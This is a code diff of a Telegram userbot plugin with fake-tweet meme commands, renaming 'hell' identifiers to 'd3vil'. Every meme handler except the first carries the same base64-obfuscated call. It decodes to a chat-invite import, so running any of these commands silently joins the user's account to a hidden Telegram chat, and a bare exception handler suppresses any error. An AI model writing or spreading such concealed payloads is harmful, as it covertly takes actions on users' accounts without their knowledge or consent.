@@ -1,18 +1,18 @@
 from . import *
 
 
-@bot.on(hell_cmd(pattern=r"tweet(?: |$)(.*)"))
+@bot.on(d3vil_cmd(pattern=r"tweet(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="tweet(?: |$)(.*)", allow_sudo=True))
 async def nope(kraken):
-    hell = kraken.pattern_match.group(1)
+    d3vil = kraken.pattern_match.group(1)
     okvai = await eor(kraken, "Trying to tweet for you...")
-    if not hell:
+    if not d3vil:
         if kraken.is_reply:
             (await kraken.get_reply_message()).message
         else:
             await eod(kraken, "I need some text to make a tweet🚶")
             return
-    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(hell))}")
+    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(d3vil))}")
     await tweeter[0].click(
         kraken.chat_id,
         reply_to=kraken.reply_to_msg_id,
@@ -22,7 +22,7 @@ async def nope(kraken):
     await kraken.delete()
 
 
-@bot.on(hell_cmd(pattern=r"trump(?: |$)(.*)"))
+@bot.on(d3vil_cmd(pattern=r"trump(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"trump(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -41,12 +41,12 @@ async def nekobot(event):
             return
     await eor(event, "Requesting trump to tweet...")
     try:
-        hell = str(
+        d3vil = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(d3vil)
     except:
         pass
     text = deEmojify(text)
@@ -55,7 +55,7 @@ async def nekobot(event):
     await event.delete()
 
 
-@bot.on(hell_cmd(pattern=r"modi(?: |$)(.*)"))
+@bot.on(d3vil_cmd(pattern=r"modi(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"modi(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -74,12 +74,12 @@ async def nekobot(event):
             return
     await edit_or_reply(event, "Requesting modi to tweet...")
     try:
-        hell = str(
+        d3vil = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(d3vil)
     except:
         pass
     text = deEmojify(text)
@@ -88,7 +88,7 @@ async def nekobot(event):
     await event.delete()
 
 
-@bot.on(hell_cmd(pattern=r"mia(?: |$)(.*)"))
+@bot.on(d3vil_cmd(pattern=r"mia(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"mia(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -107,12 +107,12 @@ async def nekobot(event):
             return
     await eor(event, "Requesting Mia to tweet...")
     try:
-        hell = str(
+        d3vil = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(d3vil)
     except:
         pass
     text = deEmojify(text)
@@ -121,7 +121,7 @@ async def nekobot(event):
     await event.delete()
 
 
-@bot.on(hell_cmd(pattern=r"dani(?: |$)(.*)"))
+@bot.on(d3vil_cmd(pattern=r"dani(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"dani(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -140,12 +140,12 @@ async def nekobot(event):
             return
     await eor(event, "Requesting Dani to tweet...")
     try:
-        hell = str(
+        d3vil = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(d3vil)
     except:
         pass
     text = deEmojify(text)
@@ -155,7 +155,7 @@ async def nekobot(event):
 
 
 # @register(pattern="^.pappu(?: |$)(.*)", outgoing=True)
-@bot.on(hell_cmd(pattern=r"pappu(?: |$)(.*)"))
+@bot.on(d3vil_cmd(pattern=r"pappu(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"pappu(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -174,12 +174,12 @@ async def nekobot(event):
             return
     await edit_or_reply(event, "Requesting pappu to tweet...")
     try:
-        hell = str(
+        d3vil = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(d3vil)
     except:
         pass
     text = deEmojify(text)
@@ -188,7 +188,7 @@ async def nekobot(event):
     await event.delete()
 
 
-@bot.on(hell_cmd(pattern=r"sunny(?: |$)(.*)"))
+@bot.on(d3vil_cmd(pattern=r"sunny(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"sunny(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -207,12 +207,12 @@ async def nekobot(event):
             return
     await eor(event, "Requesting sunny to tweet...🥰")
     try:
-        hell = str(
+        d3vil = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(d3vil)
     except:
         pass
     text = deEmojify(text)
@@ -221,7 +221,7 @@ async def nekobot(event):
     await event.delete()
 
 
-@bot.on(hell_cmd(pattern=r"johhny(?: |$)(.*)"))
+@bot.on(d3vil_cmd(pattern=r"johhny(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"johhny(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -240,12 +240,12 @@ async def nekobot(event):
             return
     await edit_or_reply(event, "Requesting johhny to tweet...😆")
     try:
-        hell = str(
+        d3vil = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(d3vil)
     except:
         pass
     text = deEmojify(text)
@@ -254,7 +254,7 @@ async def nekobot(event):
     await event.delete()
 
 
-@bot.on(hell_cmd(pattern=r"gandhi(?: |$)(.*)"))
+@bot.on(d3vil_cmd(pattern=r"gandhi(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"gandhi(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -273,12 +273,12 @@ async def nekobot(event):
             return
     await edit_or_reply(event, "Requesting baapu to tweet...")
     try:
-        hell = str(
+        d3vil = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(d3vil)
     except:
         pass
     text = deEmojify(text)
@@ -287,7 +287,7 @@ async def nekobot(event):
     await event.delete()  # bancho kitni baar bolu no offence
 
 
-@bot.on(hell_cmd(pattern=r"cmm(?: |$)(.*)"))
+@bot.on(d3vil_cmd(pattern=r"cmm(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"cmm(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -306,12 +306,12 @@ async def nekobot(event):
             return
     await eor(event, "Your banner is under creation wait a sec...")
     try:
-        hell = str(
+        d3vil = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(d3vil)
     except:
         pass
     text = deEmojify(text)
@@ -321,7 +321,7 @@ async def nekobot(event):
 
 
 
-@bot.on(hell_cmd(pattern=r"kanna(?: |$)(.*)"))
+@bot.on(d3vil_cmd(pattern=r"kanna(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"kanna(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
     text = event.pattern_match.group(1)
@@ -340,12 +340,12 @@ async def nekobot(event):
             return
     await eor(event, "Kanna is writing your text...")
     try:
-        hell = str(
+        d3vil = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(d3vil)
     except:
         pass
     text = deEmojify(text)
